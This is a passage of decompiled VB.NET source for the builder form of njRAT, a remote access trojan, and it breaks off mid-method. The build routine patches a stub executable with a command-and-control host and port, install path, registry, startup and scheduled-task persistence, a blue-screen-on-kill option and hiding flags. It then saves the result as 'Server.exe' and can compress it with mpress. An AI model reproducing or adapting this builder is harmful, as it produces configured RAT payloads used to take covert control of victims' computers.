Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Mono.Cecil
Imports Mono.Cecil.Cil

Namespace NJRAT
	' Token: 0x0200000A RID: 10
	<DesignerGenerated()>
	Public Partial Class Builder
		Inherits Form

		' Token: 0x060000B3 RID: 179 RVA: 0x00006FAC File Offset: 0x000051AC
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Builder.__ENCList
			SyncLock _ENCList
				If Builder.__ENCList.Count = Builder.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Builder.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Builder.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								Builder.__ENCList(num) = Builder.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Builder.__ENCList.RemoveRange(num, Builder.__ENCList.Count - num)
					Builder.__ENCList.Capacity = Builder.__ENCList.Count
				End If
				Builder.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x060000B6 RID: 182 RVA: 0x00008D68 File Offset: 0x00006F68
		' (set) Token: 0x060000B7 RID: 183 RVA: 0x00002780 File Offset: 0x00000980
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x060000B8 RID: 184 RVA: 0x00008D80 File Offset: 0x00006F80
		' (set) Token: 0x060000B9 RID: 185 RVA: 0x00008D98 File Offset: 0x00006F98
		Friend Overridable Property VN As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._VN
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.VN_TextChanged
				If Me._VN IsNot Nothing Then
					RemoveHandler Me._VN.TextChanged, value2
				End If
				Me._VN = value
				If Me._VN IsNot Nothing Then
					AddHandler Me._VN.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x060000BA RID: 186 RVA: 0x00008DF0 File Offset: 0x00006FF0
		' (set) Token: 0x060000BB RID: 187 RVA: 0x00002789 File Offset: 0x00000989
		Friend Overridable Property Label1 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label1 = value
			End Set
		End Property

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x060000BC RID: 188 RVA: 0x00008E08 File Offset: 0x00007008
		' (set) Token: 0x060000BD RID: 189 RVA: 0x00008E20 File Offset: 0x00007020
		Friend Overridable Property H As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._H
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.host_TextChanged
				If Me._H IsNot Nothing Then
					RemoveHandler Me._H.TextChanged, value2
				End If
				Me._H = value
				If Me._H IsNot Nothing Then
					AddHandler Me._H.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x060000BE RID: 190 RVA: 0x00008E78 File Offset: 0x00007078
		' (set) Token: 0x060000BF RID: 191 RVA: 0x00002792 File Offset: 0x00000992
		Friend Overridable Property Label2 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label2 = value
			End Set
		End Property

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x060000C0 RID: 192 RVA: 0x00008E90 File Offset: 0x00007090
		' (set) Token: 0x060000C1 RID: 193 RVA: 0x0000279B File Offset: 0x0000099B
		Friend Overridable Property Label5 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label5 = value
			End Set
		End Property

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x060000C2 RID: 194 RVA: 0x00008EA8 File Offset: 0x000070A8
		' (set) Token: 0x060000C3 RID: 195 RVA: 0x000027A4 File Offset: 0x000009A4
		Friend Overridable Property Label6 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label6 = value
			End Set
		End Property

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x060000C4 RID: 196 RVA: 0x00008EC0 File Offset: 0x000070C0
		' (set) Token: 0x060000C5 RID: 197 RVA: 0x000027AD File Offset: 0x000009AD
		Friend Overridable Property klen As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._klen
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._klen = value
			End Set
		End Property

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x060000C6 RID: 198 RVA: 0x00008ED8 File Offset: 0x000070D8
		' (set) Token: 0x060000C7 RID: 199 RVA: 0x000027B6 File Offset: 0x000009B6
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x060000C8 RID: 200 RVA: 0x00008EF0 File Offset: 0x000070F0
		' (set) Token: 0x060000C9 RID: 201 RVA: 0x000027BF File Offset: 0x000009BF
		Friend Overridable Property Label3 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label3 = value
			End Set
		End Property

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x060000CA RID: 202 RVA: 0x00008F08 File Offset: 0x00007108
		' (set) Token: 0x060000CB RID: 203 RVA: 0x000027C8 File Offset: 0x000009C8
		Friend Overridable Property exe As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._exe
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._exe = value
			End Set
		End Property

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x060000CC RID: 204 RVA: 0x00008F20 File Offset: 0x00007120
		' (set) Token: 0x060000CD RID: 205 RVA: 0x000027D1 File Offset: 0x000009D1
		Friend Overridable Property Label4 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label4 = value
			End Set
		End Property

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x060000CE RID: 206 RVA: 0x00008F38 File Offset: 0x00007138
		' (set) Token: 0x060000CF RID: 207 RVA: 0x000027DA File Offset: 0x000009DA
		Friend Overridable Property dir As ComboBox
			<DebuggerNonUserCode()>
			Get
				Return Me._dir
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Me._dir = value
			End Set
		End Property

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x060000D0 RID: 208 RVA: 0x00008F50 File Offset: 0x00007150
		' (set) Token: 0x060000D1 RID: 209 RVA: 0x00008F68 File Offset: 0x00007168
		Friend Overridable Property Idr As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Idr
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Idr_CheckedChanged
				If Me._Idr IsNot Nothing Then
					RemoveHandler Me._Idr.CheckedChanged, value2
				End If
				Me._Idr = value
				If Me._Idr IsNot Nothing Then
					AddHandler Me._Idr.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x060000D2 RID: 210 RVA: 0x00008FC0 File Offset: 0x000071C0
		' (set) Token: 0x060000D3 RID: 211 RVA: 0x000027E3 File Offset: 0x000009E3
		Friend Overridable Property GroupBox3 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox3 = value
			End Set
		End Property

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x060000D4 RID: 212 RVA: 0x00008FD8 File Offset: 0x000071D8
		' (set) Token: 0x060000D5 RID: 213 RVA: 0x00008FF0 File Offset: 0x000071F0
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				If Me._Button1 IsNot Nothing Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				If Me._Button1 IsNot Nothing Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x060000D6 RID: 214 RVA: 0x00009048 File Offset: 0x00007248
		' (set) Token: 0x060000D7 RID: 215 RVA: 0x000027EC File Offset: 0x000009EC
		Friend Overridable Property bsod As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._bsod
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._bsod = value
			End Set
		End Property

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x060000D8 RID: 216 RVA: 0x00009060 File Offset: 0x00007260
		' (set) Token: 0x060000D9 RID: 217 RVA: 0x00009078 File Offset: 0x00007278
		Friend Overridable Property Isu As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isu
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Isu_CheckedChanged
				If Me._Isu IsNot Nothing Then
					RemoveHandler Me._Isu.CheckedChanged, value2
				End If
				Me._Isu = value
				If Me._Isu IsNot Nothing Then
					AddHandler Me._Isu.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x060000DA RID: 218 RVA: 0x000090D0 File Offset: 0x000072D0
		' (set) Token: 0x060000DB RID: 219 RVA: 0x000090E8 File Offset: 0x000072E8
		Friend Overridable Property Isf As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Isf
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.Isf_CheckedChanged
				If Me._Isf IsNot Nothing Then
					RemoveHandler Me._Isf.CheckedChanged, value2
				End If
				Me._Isf = value
				If Me._Isf IsNot Nothing Then
					AddHandler Me._Isf.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x060000DC RID: 220 RVA: 0x00009140 File Offset: 0x00007340
		' (set) Token: 0x060000DD RID: 221 RVA: 0x000027F5 File Offset: 0x000009F5
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x060000DE RID: 222 RVA: 0x00009158 File Offset: 0x00007358
		' (set) Token: 0x060000DF RID: 223 RVA: 0x000027FE File Offset: 0x000009FE
		Friend Overridable Property TextBox3 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox3 = value
			End Set
		End Property

		' Token: 0x1700005B RID: 91
		' (get) Token: 0x060000E0 RID: 224 RVA: 0x00009170 File Offset: 0x00007370
		' (set) Token: 0x060000E1 RID: 225 RVA: 0x00002807 File Offset: 0x00000A07
		Friend Overridable Property Label7 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label7 = value
			End Set
		End Property

		' Token: 0x1700005C RID: 92
		' (get) Token: 0x060000E2 RID: 226 RVA: 0x00009188 File Offset: 0x00007388
		' (set) Token: 0x060000E3 RID: 227 RVA: 0x00002810 File Offset: 0x00000A10
		Friend Overridable Property TextBox2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox2 = value
			End Set
		End Property

		' Token: 0x1700005D RID: 93
		' (get) Token: 0x060000E4 RID: 228 RVA: 0x000091A0 File Offset: 0x000073A0
		' (set) Token: 0x060000E5 RID: 229 RVA: 0x00002819 File Offset: 0x00000A19
		Friend Overridable Property NumericUpDown1 As NumericUpDown
			<DebuggerNonUserCode()>
			Get
				Return Me._NumericUpDown1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As NumericUpDown)
				Me._NumericUpDown1 = value
			End Set
		End Property

		' Token: 0x1700005E RID: 94
		' (get) Token: 0x060000E6 RID: 230 RVA: 0x000091B8 File Offset: 0x000073B8
		' (set) Token: 0x060000E7 RID: 231 RVA: 0x000091D0 File Offset: 0x000073D0
		Friend Overridable Property CheckBox1 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				If Me._CheckBox1 IsNot Nothing Then
					RemoveHandler Me._CheckBox1.CheckedChanged, value2
				End If
				Me._CheckBox1 = value
				If Me._CheckBox1 IsNot Nothing Then
					AddHandler Me._CheckBox1.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700005F RID: 95
		' (get) Token: 0x060000E8 RID: 232 RVA: 0x00009228 File Offset: 0x00007428
		' (set) Token: 0x060000E9 RID: 233 RVA: 0x00002822 File Offset: 0x00000A22
		Friend Overridable Property TextBox4 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox4 = value
			End Set
		End Property

		' Token: 0x17000060 RID: 96
		' (get) Token: 0x060000EA RID: 234 RVA: 0x00009240 File Offset: 0x00007440
		' (set) Token: 0x060000EB RID: 235 RVA: 0x0000282B File Offset: 0x00000A2B
		Friend Overridable Property CheckBox2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox2 = value
			End Set
		End Property

		' Token: 0x17000061 RID: 97
		' (get) Token: 0x060000EC RID: 236 RVA: 0x00009258 File Offset: 0x00007458
		' (set) Token: 0x060000ED RID: 237 RVA: 0x00002834 File Offset: 0x00000A34
		Friend Overridable Property GroupBox4 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox4 = value
			End Set
		End Property

		' Token: 0x17000062 RID: 98
		' (get) Token: 0x060000EE RID: 238 RVA: 0x00009270 File Offset: 0x00007470
		' (set) Token: 0x060000EF RID: 239 RVA: 0x0000283D File Offset: 0x00000A3D
		Friend Overridable Property CheckBox6 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Me._CheckBox6 = value
			End Set
		End Property

		' Token: 0x17000063 RID: 99
		' (get) Token: 0x060000F0 RID: 240 RVA: 0x00009288 File Offset: 0x00007488
		' (set) Token: 0x060000F1 RID: 241 RVA: 0x00002846 File Offset: 0x00000A46
		Friend Overridable Property Host As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Host
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._Host = value
			End Set
		End Property

		' Token: 0x17000064 RID: 100
		' (get) Token: 0x060000F2 RID: 242 RVA: 0x000092A0 File Offset: 0x000074A0
		' (set) Token: 0x060000F3 RID: 243 RVA: 0x0000284F File Offset: 0x00000A4F
		Friend Overridable Property Port As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._Port
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._Port = value
			End Set
		End Property

		' Token: 0x17000065 RID: 101
		' (get) Token: 0x060000F4 RID: 244 RVA: 0x000092B8 File Offset: 0x000074B8
		' (set) Token: 0x060000F5 RID: 245 RVA: 0x000092D0 File Offset: 0x000074D0
		Friend Overridable Property E2 As CheckBox
			<DebuggerNonUserCode()>
			Get
				Return Me._E2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim value2 As EventHandler = AddressOf Me.E2_CheckedChanged
				If Me._E2 IsNot Nothing Then
					RemoveHandler Me._E2.CheckedChanged, value2
				End If
				Me._E2 = value
				If Me._E2 IsNot Nothing Then
					AddHandler Me._E2.CheckedChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000066 RID: 102
		' (get) Token: 0x060000F6 RID: 246 RVA: 0x00009328 File Offset: 0x00007528
		' (set) Token: 0x060000F7 RID: 247 RVA: 0x00002858 File Offset: 0x00000A58
		Friend Overridable Property GroupBox5 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox5 = value
			End Set
		End Property

		' Token: 0x17000067 RID: 103
		' (get) Token: 0x060000F8 RID: 248 RVA: 0x00009340 File Offset: 0x00007540
		' (set) Token: 0x060000F9 RID: 249 RVA: 0x00002861 File Offset: 0x00000A61
		Friend Overridable Property Label10 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label10 = value
			End Set
		End Property

		' Token: 0x17000068 RID: 104
		' (get) Token: 0x060000FA RID: 250 RVA: 0x00009358 File Offset: 0x00007558
		' (set) Token: 0x060000FB RID: 251 RVA: 0x0000286A File Offset: 0x00000A6A
		Friend Overridable Property Label9 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label9 = value
			End Set
		End Property

		' Token: 0x17000069 RID: 105
		' (get) Token: 0x060000FC RID: 252 RVA: 0x00009370 File Offset: 0x00007570
		' (set) Token: 0x060000FD RID: 253 RVA: 0x00002873 File Offset: 0x00000A73
		Friend Overridable Property Label8 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label8 = value
			End Set
		End Property

		' Token: 0x1700006A RID: 106
		' (get) Token: 0x060000FE RID: 254 RVA: 0x00009388 File Offset: 0x00007588
		' (set) Token: 0x060000FF RID: 255 RVA: 0x000093A0 File Offset: 0x000075A0
		Friend Overridable Property P As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._P
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As EventHandler = AddressOf Me.P_TextChanged
				If Me._P IsNot Nothing Then
					RemoveHandler Me._P.TextChanged, value2
				End If
				Me._P = value
				If Me._P IsNot Nothing Then
					AddHandler Me._P.TextChanged, value2
				End If
			End Set
		End Property

		' Token: 0x1700006B RID: 107
		' (get) Token: 0x06000100 RID: 256 RVA: 0x000093F8 File Offset: 0x000075F8
		' (set) Token: 0x06000101 RID: 257 RVA: 0x0000287C File Offset: 0x00000A7C
		Friend Overridable Property GroupBox6 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox6 = value
			End Set
		End Property

		' Token: 0x1700006C RID: 108
		' (get) Token: 0x06000102 RID: 258 RVA: 0x00009410 File Offset: 0x00007610
		' (set) Token: 0x06000103 RID: 259 RVA: 0x00002885 File Offset: 0x00000A85
		Friend Overridable Property CheckBox4 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._CheckBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._CheckBox4 = value
			End Set
		End Property

		' Token: 0x1700006D RID: 109
		' (get) Token: 0x06000104 RID: 260 RVA: 0x00009428 File Offset: 0x00007628
		' (set) Token: 0x06000105 RID: 261 RVA: 0x0000288E File Offset: 0x00000A8E
		Friend Overridable Property Label11 As Label
			<DebuggerNonUserCode()>
			Get
				Return Me._Label11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Me._Label11 = value
			End Set
		End Property

		' Token: 0x1700006E RID: 110
		' (get) Token: 0x06000106 RID: 262 RVA: 0x00009440 File Offset: 0x00007640
		' (set) Token: 0x06000107 RID: 263 RVA: 0x00002897 File Offset: 0x00000A97
		Friend Overridable Property RadioButton1 As RadioButton
			<DebuggerNonUserCode()>
			Get
				Return Me._RadioButton1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RadioButton)
				Me._RadioButton1 = value
			End Set
		End Property

		' Token: 0x06000108 RID: 264 RVA: 0x00009458 File Offset: 0x00007658
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.Builder_Load
			Builder.__ENCAddToList(Me)
			AddHandler MyBase.Load, AddressOf Me.Builder_Load
			Me.ic = Nothing
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000109 RID: 265 RVA: 0x000094A4 File Offset: 0x000076A4
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			If Not File.Exists(Application.StartupPath + "\Stubs\stub.bin") Then
				Interaction.MsgBox("No Stub File detected in : " + Application.StartupPath, MsgBoxStyle.OkOnly, Nothing)
			Else
				Encoding.UTF8.GetBytes(Me.VN.Text)
				Dim assemblyDefinition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\Stubs\stub.bin")
				Try
					For Each typeDefinition As TypeDefinition In assemblyDefinition.MainModule.GetTypes()
						Try
							Dim enumerator2 As IEnumerator(Of MethodDefinition) = CType(typeDefinition.Methods.GetEnumerator(), IEnumerator(Of MethodDefinition))
							While enumerator2.MoveNext()
								Dim methodDefinition As MethodDefinition = enumerator2.Current
								If Operators.CompareString(methodDefinition.Name, ".cctor", False) = 0 Then
									Dim enumerator3 As IEnumerator(Of Instruction) = CType(methodDefinition.Body.Instructions.GetEnumerator(), IEnumerator(Of Instruction))
									While enumerator3.MoveNext()
										Dim instruction As Instruction = enumerator3.Current
										If instruction.OpCode.Code = Code.Ldstr Then
											Dim left As String = instruction.Operand.ToString()
											If Operators.CompareString(left, "#PR", False) = 0 Then
												instruction.Operand = Me.bsod.Checked.ToString()
											ElseIf Operators.CompareString(left, "[Sleep]", False) = 0 Then
												instruction.Operand = Me.CheckBox1.Checked.ToString()
											ElseIf Operators.CompareString(left, "#path", False) = 0 Then
												instruction.Operand = Me.dir.SelectedItem.ToString().Replace("%", "")
											ElseIf Operators.CompareString(left, "[Sleep1]", False) = 0 Then
												instruction.Operand = Me.NumericUpDown1.Value.ToString()
											ElseIf Operators.CompareString(left, "[Task]", False) = 0 Then
												instruction.Operand = Me.CheckBox2.Checked.ToString()
											ElseIf Operators.CompareString(left, "#Na", False) = 0 Then
												instruction.Operand = Me.TextBox4.Text
											ElseIf Operators.CompareString(left, "[HPE]", False) = 0 Then
												instruction.Operand = Me.E2.Checked.ToString()
											ElseIf Operators.CompareString(left, "[Dark]", False) = 0 Then
												instruction.Operand = Me.TextBox1.Text
											ElseIf Operators.CompareString(left, "#EXE", False) = 0 Then
												instruction.Operand = Me.exe.Text
											ElseIf Operators.CompareString(left, "#Host", False) = 0 Then
												instruction.Operand = Me.Host.Text
											ElseIf Operators.CompareString(left, "#Port", False) = 0 Then
												instruction.Operand = Me.Port.Text
											ElseIf Operators.CompareString(left, "[RgV]", False) = 0 Then
												instruction.Operand = Me.TextBox3.Text
											ElseIf Operators.CompareString(left, "[RNVD]", False) = 0 Then
												instruction.Operand = Me.TextBox2.Text
											ElseIf Operators.CompareString(left, "[Hide]", False) = 0 Then
												instruction.Operand = Me.CheckBox6.Checked.ToString()
											ElseIf Operators.CompareString(left, "#Cop", False) = 0 Then
												instruction.Operand = Me.Idr.Checked.ToString()
											ElseIf Operators.CompareString(left, "#CST", False) = 0 Then
												instruction.Operand = Me.Isf.Checked.ToString()
											ElseIf Operators.CompareString(left, "#CRY", False) = 0 Then
												instruction.Operand = Me.Isu.Checked.ToString()
											End If
										End If
									End While
								End If
							End While
						Finally
							Dim enumerator2 As IEnumerator(Of MethodDefinition)
							enumerator2.Dispose()
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator(Of TypeDefinition)
					If enumerator IsNot Nothing Then
						enumerator.Dispose()
					End If
				End Try
				Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
				Dim saveFileDialog2 As SaveFileDialog = saveFileDialog
				saveFileDialog2.Filter = "(.exe) |*.exe"
				saveFileDialog2.FileName = "Server"
				If saveFileDialog2.ShowDialog() = DialogResult.OK Then
					assemblyDefinition.Write(saveFileDialog2.FileName)
					Interaction.MsgBox("Server Informations Successfully" & vbCrLf + saveFileDialog.FileName, MsgBoxStyle.Information, "Information")
				End If
				If Me.CheckBox4.Checked Then
					Dim str As String = " " + saveFileDialog.FileName
					Dim str2 As String = "Stubs\mpress.exe"
					Interaction.Shell(str2 + str, AppWinStyle.MinimizedFocus, False, -1)
				End If
				File.WriteAllText("Stubs\host.egg", Me.H.Text)
				File.WriteAllText("Stubs\dir.egg", Me.dir.Text)
				File.WriteAllText("Stubs\startupname.egg", Me.TextBox1.Text)
				File.WriteAllText("Stubs\regname.egg", Me.TextBox2.Text)
				File.WriteAllText("Stubs\VN.egg", Me.VN.Text)
				File.WriteAllText("Stubs\Exe.egg", Me.exe.Text)
				File.WriteAllText("Stubs\Hide.egg", Conversions.ToString(Me.CheckBox6.Checked))
				File.WriteAllText("Stubs\ReGKey.egg", Me.TextBox3.Text)
				File.WriteAllText("Stubs\Bsod.egg", Conversions.ToString(Me.bsod.Checked))
				File.WriteAllText("Stubs\regch.egg", Conversions.ToString(Me.Isu.Checked))
				File.WriteAllText("Stubs\startupch.egg", Conversions.ToString(Me.Isf.Checked))
				File.WriteAllText("Stubs\copy.egg", Conversions.ToString(Me.Idr.Checked))
				File.WriteAllText("Stubs\task.egg", Conversions.ToString(Me.CheckBox2.Checked))
				File.WriteAllText("Stubs\Mpress.egg", Conversions.ToString(Me.CheckBox4.Checked))
				Me.Close()
			End If
		End Sub

		' Token: 0x0600010A RID: 266 RVA: 0x00009B2C File Offset: 0x00007D2C
		Private Sub Builder_Load(sender As Object, e As EventArgs)
			Me.dir.SelectedIndex = 0
			If File.Exists("Stubs\host.egg") Then
				Dim text As String = File.ReadAllText("Stubs\host.egg")
				Me.H.Text = text
				Dim text2 As String = File.ReadAllText("Stubs\dir.egg")
				Me.dir.Text = text2
				Dim text3 As String = File.ReadAllText("Stubs\startupname.egg")
				Me.TextBox1.Text = text3
				Dim text4 As String = File.ReadAllText("Stubs\regname.egg")
				Me.TextBox2.Text = text4
				Dim text5 As String = File.ReadAllText("Stubs\VN.egg")
				Me.VN.Text = text5
				Dim text6 As String = File.ReadAllText("Stubs\Exe.egg")
				Me.exe.Text = text6
				Dim text7 As String = File.ReadAllText("Stubs\ReGKey.egg")
				Me.TextBox3.Text = text7
				Dim value As String = File.ReadAllText("Stubs\Bsod.egg")
